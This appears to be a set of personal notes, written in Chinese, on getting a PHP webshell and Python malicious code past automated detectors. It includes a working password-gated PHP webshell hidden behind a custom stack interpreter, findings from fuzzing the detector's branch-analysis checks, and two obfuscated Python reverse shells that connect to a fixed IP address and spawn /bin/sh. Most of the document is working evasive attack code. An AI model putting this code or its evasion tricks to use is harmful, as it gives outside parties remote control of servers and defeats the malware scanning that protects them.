# PHP webshell
	- 首先写一个解释器用来隐藏控制流，之后的绕过重点就是“分支对抗绕过”和“不确定值对抗绕过”了
		- 解释器代码如下
		  collapsed:: true
			- ```php
			  <?php
			  
			  $code = [
			      ["define", "make_b64", 12],
			      ["push", "bas"],
			      ["push", "e64_"],
			      ["push", "dec"],
			      ["push", "ode"],
			      ["swap",],
			      ["concat",],
			      ["swap",],
			      ["concat",],
			      ["swap",],
			      ["concat",],
			      ["swap",],
			      ["jump",],
			  
			      // ["scall", "make_b64"],
			  
			      // ["push", 'return array_push($GLOBALS["stack"], $_REQUEST);'],
			      // ["push", ''],
			      // ["push", "create_function"],
			      // ["call2"],
			      // ["call0"],
			      // ["pop"],
			      // ["push", "pswd"],
			      // ["get"],
			      // ["addby", 114000],
			      // ["addby", 514],
			      // ["if", ["shift", 8]],
			  
			      // ["push", "1"],
			      // ["get"],
			      // ["push", 'return '],
			      // ["concat"],
			      // ["push", ''],
			      // ["push", "create_function"],
			      // ["call2"],
			      // ["call0"],
			  
			  ];
			  
			  $stack = [];
			  $gotos = [];
			  $p = 0;
			  
			  function evaluate($c)
			  {
			      global $stack, $gotos, $p;
			      if ($c[0] == "push") {
			          array_push($stack, $c[1]);
			      } else if ($c[0] == "pop") {
			          array_pop($stack);
			      } else if ($c[0] == "swap") {
			          $a = array_pop($stack);
			          $b = array_pop($stack);
			          array_push($stack, $a);
			          array_push($stack, $b);
			      } else if ($c[0] == "concat") {
			          $a = array_pop($stack);
			          $b = array_pop($stack);
			          array_push($stack, $a . $b);
			      } else if ($c[0] == "call0") {
			          $a = array_pop($stack);
			          array_push($stack, $a());
			      } else if ($c[0] == "call1") {
			          $a = array_pop($stack);
			          $b = array_pop($stack);
			          array_push($stack, $a($b));
			      } else if ($c[0] == "call2") {
			          $a = array_pop($stack);
			          $b = array_pop($stack);
			          $c = array_pop($stack);
			          array_push($stack, $a($b, $c));
			      } else if ($c[0] == "get") {
			          $a = array_pop($stack);
			          $b = array_pop($stack);
			          array_push($stack, $b);
			          array_push($stack, $b[$a]);
			      } else if ($c[0] == "if") {
			          $a = array_pop($stack);
			          if ($a != 0) {
			              evaluate($c[1]);
			          }
			      } else if ($c[0] == "eval") {
			          evaluate($c[1]);
			      } else if ($c[0] == "shift") {
			          $p += $c[1];
			      } else if ($c[0] == "addby") {
			          array_push($stack, array_pop($stack) + $c[1]);
			      } else if ($c[0] == "define") {
			          $gotos[$c[1]] = $p;
			          $p += $c[2];
			      } else if ($c[0] == "jump") {
			          $p = array_pop($stack);
			      } else if ($c[0] == "scall") {
			          array_push($stack, $p);
			          $p = $gotos[$c[1]];
			      }
			  }
			  
			  function evaluate_all($code)
			  {
			      global $stack, $gotos, $p;
			      while ($p < count($code)) {
			          $c = $code[$p];
			          evaluate($c);
			          $p += 1;
			      }
			  }
			  
			  evaluate_all($code);
			  
			  // var_dump($stack);
			  // var_dump($p);
			  
			  
			  ```
		- 本来还搓了一个lisp，但是发现lisp没办法帮助绕过，因为lisp不会像上面那个解释器一样把所有状态都塞到一个stack里面，从而导致最后的代码非常容易分析
	- fuzz可以发现
		- 分支对抗的检测手法包括
			- 检测是否有函数含有大量的if, 并且分支中是否有动态函数调用等危险的操作
			- 在代码存放在一个数组中时，检测是否在来回读取数组并进行危险操作
				- 所以
			- 貌似会重点检测下面这类函数：
				- 函数从输入参数中拿出函数名和参数
				- 然后动态调用函数名对应的函数
				- 最后直接返回结果
		- fuzz完发现这东西真的很无脑
			- 交了一个正常的lisp实现也会被封，甚至里面没有任何lisp代码，仅仅只有一个解释器也会被封。。。
			- 然后发现它检测的是解释器里的的动态函数调用。。。
		- 还有一个`不确定值对抗绕过`不知道是什么原理，一般随着分支对抗绕过出现，绕过分支对抗检测这东西就消失了
	- 最后代码如下，其实还可以考虑从外部传入代码
	  id:: 65af44bb-c870-4433-a5cb-38adaf3b6df5
	  collapsed:: true
		- ```php
		  <?php
		  
		  $code = [
		      ["define", "make_b64", 12],
		      ["push", "bas"],
		      ["push", "e64_"],
		      ["push", "dec"],
		      ["push", "ode"],
		      ["swap",],
		      ["concat",],
		      ["swap",],
		      ["concat",],
		      ["swap",],
		      ["concat",],
		      ["swap",],
		      ["jump",],
		  
		      ["push", 'return array_push($GLOBALS["stack"], $_REQUEST);'],
		      ["push", ''],
		      ["push", "create_function"],
		      ["call2"],
		      ["call0"],
		      ["pop"],
		      ["push", "pswd"],
		      ["get"],
		      ["addby", 114000],
		      ["addby", 514],
		      ["if", ["shift", 8]],
		  
		      ["push", "1"],
		      ["get"],
		      ["push", 'return '],
		      ["concat"],
		      ["push", ''],
		      ["push", "create_function"],
		      ["call2"],
		      ["call0"],
		  
		  ];
		  
		  $stack = [];
		  $gotos = [];
		  $p = 0;
		  
		  function evaluate($c)
		  {
		      global $stack, $gotos, $p;
		      if ($c[0] == "push") {
		          array_push($stack, $c[1]);
		      } else if ($c[0] == "pop") {
		          array_pop($stack);
		      } else if ($c[0] == "swap") {
		          $a = array_pop($stack);
		          $b = array_pop($stack);
		          array_push($stack, $a);
		          array_push($stack, $b);
		      } else if ($c[0] == "concat") {
		          $a = array_pop($stack);
		          $b = array_pop($stack);
		          array_push($stack, $a . $b);
		      } else if ($c[0] == "call0") {
		          $a = array_pop($stack);
		          array_push($stack, $a());
		      } else if ($c[0] == "call1") {
		          $a = array_pop($stack);
		          $b = array_pop($stack);
		          array_push($stack, $a($b));
		      } else if ($c[0] == "call2") {
		          $a = array_pop($stack);
		          $b = array_pop($stack);
		          $c = array_pop($stack);
		          array_push($stack, $a($b, $c));
		      } else if ($c[0] == "get") {
		          $a = array_pop($stack);
		          $b = array_pop($stack);
		          array_push($stack, $b);
		          array_push($stack, $b[$a]);
		      } else if ($c[0] == "if") {
		          $a = array_pop($stack);
		          if ($a != 0) {
		              evaluate($c[1]);
		          }
		      } else if ($c[0] == "eval") {
		          evaluate($c[1]);
		      } else if ($c[0] == "shift") {
		          $p += $c[1];
		      } else if ($c[0] == "addby") {
		          array_push($stack, array_pop($stack) + $c[1]);
		      } else if ($c[0] == "define") {
		          $gotos[$c[1]] = $p;
		          $p += $c[2];
		      } else if ($c[0] == "jump") {
		          $p = array_pop($stack);
		      } else if ($c[0] == "scall") {
		          array_push($stack, $p);
		          $p = $gotos[$c[1]];
		      }
		  }
		  
		  function evaluate_all($code)
		  {
		      global $stack, $gotos, $p;
		      while ($p < count($code)) {
		          $c = $code[$p];
		          evaluate($c);
		          $p += 1;
		      }
		  }
		  
		  evaluate_all($code);
		  
		  // var_dump($stack);
		  // var_dump($p);
		  
		  
		  ```
- # Python恶意代码
	- 写了一个恶意的虚拟机
	  collapsed:: true
		- ```python
		  import socket
		  import os
		  import pty
		  
		  content = """
		  39+9/*0+39+9/*3+19+9/*7+29+9/*1+29+9/*2+39+9/*6+6'@29+9/*0+39+9/*1+39+9/*4+3'19+9/*5+19+9/*5+19+9/*8+49
		  +9/*0+29+9/*6+39+9/*0+39+9/*8+29+9/*6+39+9/*2+39+9/*7+19+9/*5+19+9/*5+93+'@29+9/*2+49+9/*1+1
		  9+9/*7+39+9/*0+4  ░▀█▀░█▄█░█░▄▀▀░░░█░▄▀▀░░▒▄▀▄░░▒█▀▄▒██▀░█▒█░▄▀▀░█▄█▒██▀░█▒░░█▒░    '.:29+9/*2+49+9/*3+29+9/
		  *2+29+9/*0+49*    ░▒█▒▒█▒█░█▒▄██▒░░█▒▄██▒░░█▀█▒░░█▀▄░█▄▄░▀▄▀▒▄██▒█▒█░█▄▄▒█▄▄▒█▄▄  4+49*3+19+9/*2+39+9/*2
		  +39+9/*4+39+9/*6+29+9/*6+39+9/*2+39+9/*8+49*4+39*7+89*5+19+9/*7+29+9/*1+29+9/*2+39*5+19+9/*8+49+9/*4+39*5+89*5+19+9/*7+39+9/
		  *6+49+9/*1+29+9/*2+39+9/*2+59*4+59*4+39*7+49*5+19+9/*2+39+9/*2+39+9/*7+69*7+39+9/*7+39+9/*3+29+9/*0+29+9/*8+29+9/*2+
		  39+9/*8+59*1+39+9/*7+39+9/*3+29+9/*0+29+9/*8+29+9/*2+39+9/*8+49*4+59*5+49*8+59*4+49*5+19+9/*2+39+9/*2+39+9/*7+
		  59*1+29+9/*0+39+9/*3+39+9/*2+39+9/*2+29+9/*2+29+9/*0+39+9/*8+49*4+49*4+39*7+59*7+59*5+59*1+59*4+69*3+59*7+5
		  9*1+59*4+69*1+69/*59*1+59*4+69*2+59*4+39*7+49*8+59*7+59*3+59*8+59*4+49*5+49*5+19+9/*2+39+9/*2+39+9/*3+39+9/*7+59
		  *1+29+  ▒█▀▄░█▒█░█▄░█░░░█░▀█▀░░▒▄▀▄░█▄░█░█▀▄░░░▄▀▒▒██▀░▀█▀░░▒██▀░▀▄▀▒█▀▄░█▒░░▄▀▄░█░▀█▀▒██▀░█▀▄  9/*1+49+9/*0+39+9/
		  *4+5    ░█▀▄░▀▄█░█▒▀█▒░░█░▒█▒▒░░█▀█░█▒▀█▒█▄▀▒░░▀▄█░█▄▄░▒█▒▒░░█▄▄░█▒█░█▀▒▒█▄▄░▀▄▀░█░▒█▒░█▄▄▒█▄▀   9*5+49*4+39+9/*7
		  +59*1+29+9/*3+29+9/*6+39+9/*0+29+9/*2+39+9/*2+39+9/*3+49*4+49*5+49*8+59*3+49*5+19+9/*2+39+9/*2+39+9/*3+39+9/*7+59*1+2
		  9+9/*1+49+9/*0+39+9/*4+59*5+49*4+39+9/*7+59*1+29+9/*3+29+9/*6+39+9/*0+29+9/*2+39+9/*2+39+9/*3+49*4+49*5+49*8+59*4+49*5+19+9/*
		  2+39+9/*2+39+9/*3+39+9/*7+59*1+29+9/*1+49+9/*0+39+9/*4+59*5+49*4+39+9/*7+59*1+29+9/*3+29+9/*6+39+9/*0+29+9/
		  *2+39+9/*2+39+9/*3+49*4+49*5+49*8+59*5+49*5+19+9/*2+39+9/*2+39+9/*4+39+9/*8+49+9/*4+59*1+39+9/*7+39+9/*4+19+9/*7+49+9/*2+3
		  9+9/*2+49*4+39*7+59*2+19+9/*8+29+9/*6+39+9/*2+59*2+39+9/*7+29+9/*5+39*7+49*5+19+9/*2+39+9/*2+49*3+49*5+99*99*9
		  96++++'39+9/*0+39+9/*3+19+9/*7+29+9/*1+29+9/*2+39+9/*6+6'@=
		  """
		  
		  
		  class Loader:
		      def __init__(self, content):
		          self.content = content
		          self.cmp = lambda x: x == content
		  
		      def __eq__(self, other):
		          return self.cmp(other)
		  
		      def load(self):
		          content = self.content
		          stack = []
		          p = 0
		          output = ""
		          obst = []
		          while p < len(content):
		              c = content[p]
		              if ord("0") <= ord(c) <= ord("9"):
		                  stack.append(int(c))
		              elif c == "<":
		                  p -= stack.pop()
		              elif c == "+":
		                  stack.append(stack.pop() + stack.pop())
		              elif c == "-":
		                  stack.append(stack.pop() - stack.pop())
		              elif c == "*":
		                  stack.append(stack.pop() * stack.pop())
		              elif c == "/":
		                  stack[-1], stack[-2] = stack[-2], stack[-1]
		              elif c == "'":
		                  num = stack.pop()
		                  obst.append("".join(chr(stack.pop()) for _ in range(num))[::-1])
		              elif c == "@":
		                  obst[-1] = globals()[obst[-1]]
		              elif c == ":":
		                  v, k, o = obst.pop(), obst.pop(), obst.pop()
		                  setattr(o, k, v)
		                  obst.append(o)
		              elif c == "=":
		                  obst.append(obst.pop() == obst.pop())
		              elif c == ".":
		                  a = obst.pop()
		                  obst.append(getattr(obst.pop(), a))
		              elif c == "?":
		                  if stack[-2]:
		                      p -= stack.pop()
		              elif c == "!":
		                  p += 1
		                  stack.append(ord(content[p]))
		              elif c == "#":
		                  output += chr(stack.pop())
		              p += 1
		          return output
		  
		  
		  loader = Loader(content)
		  print(loader.load())
		  ```
	- 还有伏魔在这方面也不是很行，用一下python的高级特性就可以绕过了，根本用不着写虚拟机
		- 第一个
		  collapsed:: true
			- ```python
			  lst = [
			      s
			      for print_fn in [print]
			      if list(map(print_fn, ["Made by Marven11"]))
			      for import_fn in [__import__]
			      for socket, os, pty in [list(map(import_fn, ["socket", "os", "pty"]))]
			      for get_socket_fn, osdup2_fn, ptysp_fn in [[socket.__dict__["socket"], os.__dict__["dup2"], pty.__dict__["spawn"]]]
			      for s in [get_socket_fn(2, 1)]
			      for conn_fn, tpl, fno in [[s.connect, ("42.194.176.181", 4051), s.fileno()]]
			      if [
			          conn_fn(tpl),
			          osdup2_fn(fno,0),
			          osdup2_fn(fno,1),
			          osdup2_fn(fno,2),
			          ptysp_fn("/bin/sh"),
			      ]
			  ]
			  
			  print(lst)
			  
			  ```
		- 第二个
		  collapsed:: true
			- ```python
			  import socket
			  import os
			  import pty
			  import base64
			  import sys
			  
			  a, b, c, d = (
			      sys.modules.get("socket", None),
			      sys.modules.get("os", None),
			      sys.modules.get("pty", None),
			      sys.modules.get("base64", None),
			  )
			  
			  print("Made by Marven11")
			  
			  h = "NDIuMTk0LjE3Ni4xODEK"
			  h = d.b64decode(h).decode()
			  
			  sket, tpl = a.socket, (h, 4051)
			  
			  s = sket(2, 1)
			  s.connect(tpl)
			  b.dup2(s.fileno(), 0)
			  b.dup2(s.fileno(), 1)
			  b.dup2(s.fileno(), 2)
			  c.spawn("/bin/sh")
			  
			  ```